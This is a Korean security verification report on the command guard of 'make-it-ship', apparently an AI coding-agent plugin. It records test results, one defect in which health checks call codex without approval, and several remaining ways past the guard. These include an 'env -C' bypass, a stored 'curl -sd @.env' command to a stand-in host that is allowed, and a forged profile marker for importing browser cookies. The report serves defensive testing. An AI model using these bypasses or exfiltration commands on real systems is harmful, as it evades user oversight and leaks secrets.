# M9 독립 검증 3회차: 묶음 D·E

- 대상: 통합 라인 HEAD 7714f8b (detached worktree `/Users/mason.lee/Dev/Git/tools/mis-v9de`). r2 D/E 수정은 9e8f1c9(WIP, "tests not run")이고, e8a6d69로 이 라인에 병합됐다.
- 검증자: 독립 검증자다. 이 코드를 작성하지 않았다. 저장소에 쓴 파일은 이 보고서 하나다. 커밋, push, tag는 하지 않았다.
- 격리:
  - TMPDIR, HOME, MIS_STATE_HOME, CLAUDE_CONFIG_DIR는 모두 `/private/tmp/claude-501/v9de-tmp` 아래에 두었다.
  - codex와 gbrain은 인자를 로그에 남기는 stub으로 바꿨다. Chrome 데이터는 scratch HOME 안의 가짜 디렉터리다.
  - 외부 네트워크와 실제 외부 CLI는 쓰지 않았다. 내가 띄운 browse 데몬은 모두 종료했다(`ps`로 확인).
- M8 R3-1..R3-4(upload 유출, chrome-args, visual-verdict)는 범위 밖이다.

## 요약 판정: **DEFECTS FOUND**

- r2 항목 N1–N8은 원래 재현 절차로는 모두 수정됐다.
- 남은 결함은 1건(MEDIUM)이다. 수정 커밋이 RISKS에 적은 문장이 사실과 다르다. 그 문장은 "`mis health`와 `session create`도 MIS_CLI를 설정한다"고 적었지만, 두 명령은 MIS_CLI 없이 저장된 check를 실행한다. 그래서 check 스크립트 안의 `mis ask codex`가 ask 없이 실행된다(아래 R3-DE-1).
- `npm test`는 737개 중 736개 통과, 1개 실패다(skip 0, 두 번 실행해도 같다). 실패한 A6 uninstall은 A 묶음 테스트다. 원인은 checkout 디렉터리 이름이다(`isOurStatusLine`이 경로에 `make-it-ship`을 요구하는데, 이 worktree는 `mis-v9de`다). 같은 트리를 `make-it-ship`이라는 디렉터리로 복사하면 통과한다. D/E 결함은 아니다.

## 실행한 명령과 수치

| # | 명령 / 확인 | 결과 |
|---|---|---|
| 1 | `npm test` 1회차 (TMPDIR=scratch) | tests 737, **pass 736 / fail 1**, skipped 0, todo 0. 실패는 #225 A6 uninstall |
| 2 | `npm test` 2회차 | 같다(736/1, skip 0). pair 테스트 #253–#255는 두 번 모두 통과했다(r2의 `fetch failed`는 재현되지 않음) |
| 3 | A6만 단독 실행(2회) / 같은 트리를 `.../cp/make-it-ship/`로 복사해 실행 | fail·fail / **pass**. checkout 경로 이름에 따라 결과가 갈린다 |
| 4 | `claude plugin validate .claude-plugin/plugin.json` | ✔ Validation passed |
| 5 | `policy.test.mjs`와 `policy-m9de.test.mjs`를 148자 TMPDIR로 실행(N6 조건) | 129/129 pass |
| 6 | `git grep -nE "\.skip\|\.only\|todo\(\|not implemented\|TODO\|FIXME" -- scripts skills agents hooks tests` | skip, only, stub는 없다. 걸린 것은 run 상태값 `'TODO'`, lint 규칙, 문서, 그리고 기록된 `shortcut:` 2건(design-board 정적 보드, iOS 브리지 URL 수동 지정)이다 |
| 7 | guard 직접 호출(PreToolUse JSON → `scripts/guard.mjs`)로 약 90개 명령 분류 | 아래 표와 결함 참조 |
| 8 | 실제 실행(stub codex, gbrain, 로컬 Chrome headless) | 평가기, deploy, health, session create, connect, chain, tab-each, gbrain, telemetry, probe, landing-report, mission-board |

## r2 항목별 재검증

| 항목 | 다시 해 본 것 | 판정 |
|---|---|---|
| N1 저장소 루트 불일치 | r2 그대로 했다. 빈 `sub2/.git`을 만들고 그 아래에서 `autoresearch eval m1`을 실행했다. guard는 루트의 evaluator.json(`mis ask codex leak1`)을 읽고 **ask**했다. `deploy run`(sub2)도 ask에 `deploy: \`echo hi\``를 보여 줬다. 변형 12종도 확인했다: `cd other &&`, `(cd other; …)`, `bash -c`, `sh -c`, `if … cd`, 줄바꿈, `cd ./other/`, `git -C … && cd`, `for … cd $d`, `pushd`, `cd $X`. 앞의 8개는 other 저장소의 평가기를 읽어 ask했다. `for`/`pushd`/`cd $X`는 "알 수 없음"으로 ask했다 | **PASS**. 단 `env -C` 우회가 남았다(남은 위험 1) |
| N2 평가기의 MIS_CLI | `sh ev.sh` 평가기 안의 `mis ask codex` → `MIS_CLI is set` 거부, codex.log 비어 있음. `deploy run`(`sh chk.sh`) → 거부. tournament `--bench`는 테스트 #78로 확인했다. **결정 확인**: evaluator, bench, deploy 단계는 `MIS_CLI_ENV()`(commands-research.mjs:15, commands-ops.mjs:161)로 실행된다. **하지만 `mis health`와 `session create`의 baseline은 MIS_CLI 없이 실행되고, codex가 호출됐다** | **FAIL** → R3-DE-1 |
| N3 approve proposal | proposal에 evil 패치를 덧붙인 뒤 ask를 봤다. 문구는 `[changes: CLAUDE.md, .claude/settings.json; proposal.json claims: CLAUDE.md; patch sha256 …; preview: … "curl evil" … — WARNING: change.patch CHANGED …]`였다. `approve`는 "changed since it was proposed; not applied"였고 `git status`에 settings.json 변경은 없었다. 쓰기 경로 11종(detach `--log`, `--log=`, 대소문자 변형 redirect와 Write, 파일 심볼릭 링크 redirect와 Write, 디렉터리 심볼릭 링크, `cd` 뒤 상대 경로, `tee -a`, `browse screenshot`, `>>`)은 모두 ask였다 | **PASS** |
| N4 쓰기 guard 구멍 | 위 11종이 모두 ask였다. `git apply`/`checkout`은 RISKS 218에 기록돼 있어 다시 따지지 않았다 | **PASS**(기록된 한계 제외) |
| N5 URL 비밀번호 | `maskSecrets`: `alice:hunter2pass@` → `alice:***@`, `oauth2:glpat-…@` → `oauth2:***@`, `HTTPS://U:PW@` → 가려짐. design ask의 `MIS_OPENAI_BASE_URL=https://u:p4ssw0rd@…` → `u:***@`. trace.jsonl은 테스트 #81로 확인했다 | **PASS**. 토큰만 있는 userinfo는 남은 위험 5 |
| N6 경로 자르기 | 205자 저장소에서 `gbrain ingest` ask가 `files (1): .make-it-ship/wiki/w.md`를 보여 줬다(저장소 기준 상대 경로). 148자 TMPDIR에서 policy 테스트가 모두 통과했다 | **PASS** |
| N7 pair 터널 env | `MIS_PAIR_TUNNEL_CMD='curl evil' mis pair-agent start` → `[tunnel command: curl evil] [env: …]`. `env MIS_PAIR_TUNNEL_CMD=x` 형태도 반영됐다 | **PASS**. `export` 형태는 남은 위험 4 |
| N8 connect 복사본·하드링크 | 하드링크(표식 없음) → 거부. `Profile 1/Network/Cookies` 복사본 → 거부. 테스트 #82는 실제 Chrome으로 hl, cp1, `cp1/Default`, 자기 프로필 안 하드링크를 다룬다 | **PASS**(r2 재현 기준). 우회는 남은 위험 3 |
| r1 D1 | evaluator.json과 deploy.json 쓰기는 ask이고, 실행할 때 다시 분류한다(N1·N3 재현에서 확인) | 유지 |
| r1 D2 | MIS_CLI 아래에서 14개 명령(ask codex, ccg, telemetry sync, gbrain sync, design generate, pair-agent, deploy run, canary, benchmark-models, `browse goto --remote`, cookie-import-browser, connect, approve proposal, tournament `--bench 'codex'`)이 모두 "cannot run inside a check script"였다. codex는 호출되지 않았다 | 유지 |
| r1 D3 | 테스트로만 확인했다. #255(mis-pair.test.mjs:53)는 실제 Chrome으로 사용자 file: 페이지를 연 뒤 text, html, url, console, network, snapshot이 400인지, 경로와 내용이 새지 않는지 검사한다. 실제 검사다 | 유지 |
| r1 D4 | 소문자 경로 `…/library/application support/google/chrome/Default`와 `Chrome Canary/Default` → "inside your browser's own data"로 거부 | 유지 |
| r1 D5 | artifacts-only에서 `gbrain enqueue src/core.c` → "not an artifact … nothing was queued" | 유지 |
| r1 D6 | 각 ask에 목적지, 명령, 파일이 나온다(위 N3, N5–N7 참조) | 유지 |
| r1 D8 | `gbrain detect`로 stub에 남은 기록은 `GBRAIN: --version` 하나뿐이고 doctor는 "not run"이다 | 유지 |

## 표본 행 판정 (gap-matrix D/E, ABSORBED·PARTIAL 29행)

판정 근거는 두 가지다. 하나는 내가 직접 본 guard 결정이나 실행 결과이고, 다른 하나는 npm test에서 통과한 테스트다. 열어 본 테스트 본문(mis-pair D3, m9-fix-de N2/N3/N5/N8, mis-models, mis-gbrain, mis-telemetry)은 모두 stub CLI와 127.0.0.1 서버만 쓰고, 동작을 실제로 검사한다(항상 참인 검사가 아니다). mis-ops의 `s.test`는 링크 파서용 문자열이다.

| 줄 | 행 | 판정 | 근거 |
|---|---|---|---|
| 87 | ask | 유지 | `ask gemini q` → ask(`[to: the gemini CLI]`). MIS_CLI 아래에서는 거부 |
| 89 | autoresearch | 유지(보안은 R3-DE-1과 무관) | init, start, eval을 직접 실행. 평가기를 다시 분류하고 MIS_CLI를 설정 |
| 91 | ccg | 유지 | `ccg q` → ask |
| 113 | sciomc | 유지 | `research start` allow(로컬). mis-research 테스트 통과 |
| 114 | self-improve | 유지 | propose, approve, sha 고정, 패치 교체 거부를 직접 실행 |
| 284 | omc interop | 유지 | `interop x` → ask |
| 294 | omc wait | 테스트로만 확인 | mis-ops 테스트 통과. 내 `wait detect` 입력 형식은 맞지 않아 결과로 세지 않았다 |
| 301 | mission-board | 유지 | 읽기 전용 JSON 출력 |
| 379 | benchmark-models (PARTIAL) | 유지 | ask, MIS_CLI 거부 |
| 381 | canary | 유지 | `canary http://127.0.0.1:9`와 `https://prod.example` 모두 ask(`[targets: …]`). 테스트 #163, #164, #236 |
| 383 | codex (PARTIAL) | 유지 | `codex exec` 직접 호출과 `mis ask codex` 모두 ask |
| 384 | connect-chrome (PARTIAL) | 유지(범위는 남은 위험 3) | connect는 항상 ask. 거부 사례는 위 표 |
| 403–405 | ios-design-review, ios-fix, ios-qa (PARTIAL) | 유지 | `ios daemon start --tailnet`과 `ios mint` → ask. relay는 기본으로 127.0.0.1에만 열린다(ios-relay.mjs:29) |
| 406 | ios-sync | 유지 | `--apply`만 ask, 미리보기는 allow |
| 407 | land-and-deploy | 유지 | `deploy run`이 로컬 명령으로 DEPLOYED. 단계는 MIS_CLI로 실행. `--dry-run`은 명령을 실행하지 않는다(commands-ops.mjs:213) |
| 408 | landing-report | 유지 | gh가 없으면 `OFFLINE` |
| 412 | pair-agent (PARTIAL) | 유지 | `--local`도 ask. #253–#255 통과 |
| 422 | scrape | 유지 | download, scrape, archive는 항상 ask. chain, tab-each 안에서는 데몬이 거부(직접 실행) |
| 423 | setup-browser-cookies | 유지 | cookie-import-browser는 ask. chain 파일과 stdin chain 안의 cookies, cookie-import, header, state는 데몬이 거부 |
| 424 | setup-deploy | 유지 | `--write`는 ask이고 저장할 명령을 보여 준다 |
| 426 | sync-gbrain (PARTIAL) | 유지 | sync와 ingest는 ask이고 파일 목록을 보여 준다 |
| 428 | skillify | 유지 | skill run은 chain으로 실행되므로 자격 증명 명령이 거부된다(skills.mjs:68) |
| 441 | telemetry preamble | 유지 | 새 HOME에서 `enabled:false`, `endpoint:null`. endpoint가 없으면 sync는 "nothing was sent" |
| 453 | gstack-analytics | 유지 | 로컬 JSONL, allow |
| 454 | artifacts-init | 유지 | ask |
| 461 | brain-restore | 유지 | ask |
| 462 | brain-sync | 유지 | ask, 등급 재검사(#196) |
| 465 | codex-probe | 유지 | stub 기록이 `--version` 하나뿐이다(아무것도 보내지 않음) |
| 467 | community-dashboard (PARTIAL) | 유지 | ask |
| 471 | gstack-detach | 유지 | `detach --log <저장 파일>`은 ask |
| 542 | headed 모드 | 유지(남은 위험 3) | connect 거부 사례(위) |

E 묶음 브라우저 기능(inspect, ux-audit, media, focus, memory, style, `snapshot -C`, prettyscreenshot, cleanup)은 guard에서 allow다. 구현을 읽어 봤다. style과 `--hide`는 값을 `callOn`/`JSON.stringify`로 넘긴다. 임의 JS를 실행하는 경로는 없다. M8의 GATED(storage, js, eval, upload)를 우회하지 않는다. `tab-each … --remote`는 ask다.

## 스텁·skip

없다. 위 명령 6 참조.

## 결함 목록

### R3-DE-1 [MEDIUM] `mis health`와 `session create` baseline이 MIS_CLI 없이 저장된 check를 실행한다. RISKS 216의 "모두 MIS_CLI를 설정" 문장은 사실이 아니다

- 위치:
  - `scripts/lib/commands-flow.mjs:92` (`health`): `env: { CI: '1', ...process.env }`
  - `scripts/lib/commands-team.mjs:328` (`baseline`): 같은 형태
  - 반면 `mis check`(commands.mjs:405)와 `bench`(:723)는 MIS_CLI를 설정한다.
- 근거 문장: `docs/PROGRESS.md:216`(9e8f1c9에서 작성, `git blame`으로 확인)
  > 저장된 명령을 실행하는 곳은 모두 같은 방식이다: `mis check`/`bench`/`health`·`session create`(기준선 quick check)… 이 실행기들은 모두 `MIS_CLI`를 설정하므로, 스크립트 안의 mis 명령은 ask 대상이면 거부된다.
- 재현(scratch 저장소 `r2`):
  1. 준비: `.make-it-ship.json`을 `{"version":1,"checks":{"test":{"argv":["sh","chk.sh"]}}}`로 둔다. chk.sh는 `node …/mis.mjs ask codex leak-from-health-check; exit 0`이다.
  2. guard에 `mis health`를 넣으면 allow다(stored check `sh chk.sh` 자체는 무해).
  3. `mis health --no-record`를 실행하면 stub codex.log에 `CODEX CALLED: exec leak-from-health-check`가 남는다.
  4. `mis session create feature x`: guard allow, 실행 후 같은 줄이 codex.log에 남는다.
  5. 대조군: 같은 check를 `mis start` 뒤 `mis check test`로 실행하면 "cannot run inside a check script (MIS_CLI is set)"로 거부되고 codex.log는 비어 있다.
- DEFECT 분류 근거:
  - guard 파일 쪽 발견이 아니다. 실행기가 환경을 빠뜨린 것이다.
  - r2 N2의 기대("check 스크립트와 같은 차단이 있거나 RISKS에 기록")에 대해, 수정 커밋은 RISKS에 "차단된다"고 적었다. 그 주장이 거짓이므로, 기록된 위험을 다시 따지지 않는다는 규칙의 예외에 해당한다.
- 영향: 외부 전송이 ask 없이 실행된다. r1 D1, r2 N2와 같은 경로다.
- 수정 제안: 두 곳에 `MIS_CLI_ENV()`를 쓰고, `CI: '1'`은 유지한다. N2 테스트(m9-fix-de)에 health와 session create를 추가한다.

## 남은 위험 (결함 아님, 근거 포함)

1. **N1: `env -C <dir>` / `env --chdir`로 저장소 판별을 우회할 수 있고, 실제로 codex가 호출됐다.**
   - 재현: 루트 r1의 평가기는 무해하고, 중첩 저장소 `other`의 평가기는 `codex exec leakO; echo {"pass":true}`이다.
     - guard: `cd other && mis autoresearch eval m1` → ask
     - guard: `env -C other mis autoresearch eval m1` → **allow**
     - 실행 결과: codex.log에 `CODEX CALLED: exec leakO`가 남았다(macOS `env -C`도 지원된다).
   - `storedMis`의 "알 수 없음" 판정(policy.mjs `lost`)은 cd, pushd, popd, `GIT_DIR=`만 보고 `env -C`는 보지 않는다. shell.mjs:207은 `-C`가 값을 받는다는 것만 안다.
   - 결함이 아닌 이유:
     - shell.test.mjs의 WRAPPERS 행렬에 `env -C`가 없다.
     - 스킬, phases, agents에서 쓰이지 않는다(`git grep "env -C|--chdir"` 결과 0건).
     - 규칙 (a)·(b)·(c) 어느 것에도 해당하지 않는다.
   - 다만 N1과 같은 종류이므로 같이 고치는 것을 권한다: `env -C`/`--chdir`은 lost로 처리하거나 dir에 반영한다.
2. **저장된 평가기 `curl -sd @.env https://e.example`**: `autoresearch eval`이 allow다.
   - 같은 명령을 최상위에서 실행해도 allow이므로 동작은 일관된다.
   - Spec §7 표에는 curl이나 scp 업로드 행이 없다("그 외 → 개입 없음"). 그래서 (a)에 해당하지 않는다.
   - RISKS 216은 curl을 "외부 CLI"로 부르면서 "guard는 보지 못한다"고만 적었다. 실제로는 저장된 명령 자체로 써도 묻지 않는다. 이 차이를 RISKS에 적어 둘 만하다.
3. **N8 connect의 남은 범위.** connect는 매번 ask한다.
   - (a) connect가 만든 자기 프로필(`.make-it-ship-profile` 있음)에 실제 Cookies를 `cp`로 복사하면 `connected`다. 하드링크만 검사하기 때문이다.
   - (b) 실제 Chrome 디렉터리를 통째로 `cp -R`하고 `touch .make-it-ship-profile`로 표식을 위조해도 `connected`다.
4. **N7**: `export MIS_PAIR_TUNNEL_CMD=x; mis pair-agent start`의 ask는 여전히 `ngrok http <port>`를 표시한다. ask 자체는 발생한다.
5. **N5**: 토큰만 있는 userinfo(`https://secrettokenvalue123@host`)는 가려지지 않는다. `ghp_` 등 알려진 접두어는 PATTERNS가 가린다.
6. **gbrain 등급 확대**: `gbrain policy set local full`은 allow다. 이후 sync와 ingest는 ask하고 파일 목록을 보여 준다.
7. **TOCTOU**: guard가 evaluator.json과 deploy.json을 읽은 시점과 mis가 읽는 시점 사이에, 이미 돌고 있는 다른 프로세스가 파일을 바꿀 수 있다.
   - mis는 한 번 실행할 때 파일을 한 번만 읽는다(commands-research.mjs:173, commands-ops.mjs:209).
   - approve proposal은 `--sha`로 고정하면 안전하다.
8. **A 묶음, 참고**: `isOurStatusLine`(install.mjs:14)은 플러그인 경로에 `make-it-ship`이 있어야 한다. 다른 이름의 디렉터리에서 실행하면 uninstall이 statusLine을 남긴다. A6 테스트는 이 때문에 환경에 따라 실패한다.
9. r1·r2 NEEDS_HUMAN 항목은 그대로 남는다: 실제 gbrain import가 심볼릭 링크를 따라가는지, 쿠키를 가져온 사이트를 iframe으로 띄운 경우, 실제 ngrok·codex·gemini·Keychain·iOS 기기.
